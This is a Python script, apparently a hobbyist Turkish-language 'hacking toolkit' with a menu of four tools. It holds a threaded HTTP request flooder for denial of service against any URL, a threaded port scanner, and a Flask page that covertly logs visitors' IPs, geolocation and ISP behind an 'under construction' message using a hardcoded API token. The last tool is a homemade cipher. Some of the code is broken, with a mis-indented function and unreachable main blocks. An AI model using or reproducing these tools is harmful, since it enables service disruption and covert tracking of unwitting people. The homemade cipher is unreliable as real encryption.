def dostool():
    temizle()
    import requests
    import threading

    hazir = False
    url = input("urlyi giriniz: ")
    thread = int(input("thread giriniz:"))
    hazir = True

    def dos():
        while True:
            try:
                response = requests.get(url)
                print(f"[{threading.current_thread().name}] {response.status_code}")
            except Exception as e:
                print(f"Hata: {e}")

    for i in range(thread):
        t = threading.Thread(target=dos, name=f"Thread-{i}")
        t.start()
def portscannertool():
    temizle()
    import socket
    import threading
    hedef = input("nereyi taratacaksın: ")
    portistek = int(input("hangi porta kadar tarıyalım: "))
    port = portistek

    def portscan(port):
        soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soket.settimeout(0.5)
        sonuc = soket.connect_ex((hedef, port))    
        if sonuc == 0:
            print(f"gardaş {port} açık")    
        soket.close()

    thread = []
    for port in range(1, port+1):
        t = threading.Thread(target=portscan, args=(port,))
        thread.append(t)
        t.start()
    
    for t in thread:
        t.join()
    
    print("tarama tamamlandı")
    input("çıkmak için enter")
    karar()
def ipsitetool():
    temizle()
    from flask import Flask, request
    import requests
    from datetime import datetime

    app = Flask(__name__)

    admins = "95.8.118.61"


    TOKEN = "74b34b84cab74f"

    @app.route('/')
    def home():
        try:
            ipsee = request.headers.get('X-Forwarded-For', request.remote_addr)

            if ipsee == "127.0.0.1" or ipsee.startswith("192.168."):
                ip = requests.get("https://api.ipify.org", timeout=3).text

            location = requests.get(
                f'https://ipinfo.io/{ip}/json?token={TOKEN}',
                timeout=3
            ).json()

            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            log_entry = (
                f"\n[{now}] görünen IP: {ipsee} gerçek IP: {ip} | Konum:  "
                f"{location.get('country')}, {location.get('city')}, {location.get('loc')} | "
                f"ISP: {location.get('org')}\n"
            )


            with open("log.txt", "a", encoding="utf-8") as f:
                f.write(log_entry)

        except Exception as e:
            print("HATA:", e)

        return "<h3>Hoş geldin şimdilik yapım aşamadındayız sonra tekrar gel :)</h3>"

    @app.route("/admin")
    def admin():
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip == "127.0.0.1" or ip.startswith("192.168."):
                ip = requests.get("https://api.ipify.org", timeout=3).text

        if ip == admins:
            try:
                with open("log.txt", "r", encoding="utf-8") as f:
                    logs = f.read()
                return f"<pre>{logs}</pre>"
            except Exception as e:
                return f"<b>Hata oluştu:</b> {e}"
        else:
            return "<h3>Erişim reddedildi! Sen kimsin aq??</h3>"


    if __name__ == '__main__':
        app.run(threaded=True)
def temizle():
    import os
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def karar():
    temizle()
    print("dos == 1")
    print("===")
    print("portscanner == 2")
    print("===========")
    print("ipsite == 3")
    print("======")
    print("şifreleme == 4")
    print("=========")
    print("")

    secim = int(input("seçimin: "))

    if secim == 1:
        dostool()
    elif secim == 2:
        portscannertool()
    elif secim == 3:
        ipsitetool()
    elif secim == 4:
        şifre()
def şifre():
    import base64
    import hashlib
    import random
    import os
    import pyperclip

    ALPHABET = (
        "abcçdefgğhıijklmnoöprsştuüvyzwx"
        "ABCÇDEFGĞHIİJKLMNOÖPRSŞTUÜVYZWX"
        "0123456789"
        "!@#$%^&*()_+-=[]{}|;:',.<>/?~`\\ "
    )
    
    def get_seed(seed_str):
        h = hashlib.sha512(seed_str.encode()).hexdigest()
        return int(h, 16)
    
    def shift(ch, k):
        return ch if ch not in ALPHABET else ALPHABET[(ALPHABET.index(ch) + k) % len(ALPHABET)]
    
    def unshift(ch, k):
        return ch if ch not in ALPHABET else ALPHABET[(ALPHABET.index(ch) - k) % len(ALPHABET)]
    
    def encrypt(msg, seed_str):
        seed = get_seed(seed_str)
        r = random.Random(seed)
        encrypted, mask = [], []
    
        for i, ch in enumerate(msg):
            k = (seed + i * 31) % len(ALPHABET)
            encrypted.append(shift(ch, k))
            mask.append('1')
            noise = r.choice(ALPHABET)
            encrypted.append(noise)
            mask.append('0')
    
        prefix = hashlib.md5((msg + seed_str).encode()).hexdigest()[:2]
        suffix = hashlib.sha1((seed_str + msg).encode()).hexdigest()[-2:]
        raw = prefix + ''.join(encrypted) + suffix
        raw_b64 = base64.urlsafe_b64encode(raw.encode()).decode()
        mask_hex = hex(int(''.join(mask), 2))[2:]
    
        return f"{raw_b64}.{mask_hex}"
        def decrypt(cipher, seed_str):
        try:
            b64, mask_hex = cipher.split('.')
            raw = base64.urlsafe_b64decode(b64.encode()).decode()
            content = raw[2:-2]
            mask_bin = bin(int(mask_hex, 16))[2:].zfill(len(content))
        except:
            return "[Geçersiz format]"
    
        seed = get_seed(seed_str)
        result = []
        i = 0
        for bit in mask_bin:
            if bit == '1':
                k = (seed + len(result) * 31) % len(ALPHABET)
                result.append(unshift(content[i], k))
            i += 1
        return ''.join(result)
    def clear():
        os.system("cls" if os.name == "nt" else "clear")
    def menu():
        clear()
        print("1) metni şifrele")
        print("===============")
        print("2) şifreyi çöz")
        print("")
    def şifre():
        clear()
        metin = input(" Mesaj: ")
        seed = input(" Seed (anahtar): ")
        sonuc = encrypt(metin, seed)
        pyperclip.copy(sonuc)
        print("sonuç panoya kopyalandı")
        input("\nDevam etmek için Enter’a bas...")
        çöz()
    def çöz():
        clear()
        sifreli = input(" Şifreli mesaj: ")
        seed = input(" Seed (anahtar): ")
        print("="*52)
        print(decrypt(sifreli, seed))
        print("="*52)
        input("\nDevam etmek için Enter’a bas...")
        şifre()
        
        
    
    if __name__ == "__main__":
        while True:
            menu()
            secim = input("Seçimin: ").strip()
            if secim == "1":
                şifre()
            elif secim == "2":
                çöz()
            elif secim == "def":
                print("doğru bildin!! 3sn sonra program kapanacak... iyi dersler!")
            else:
                break
    
            
            
karar()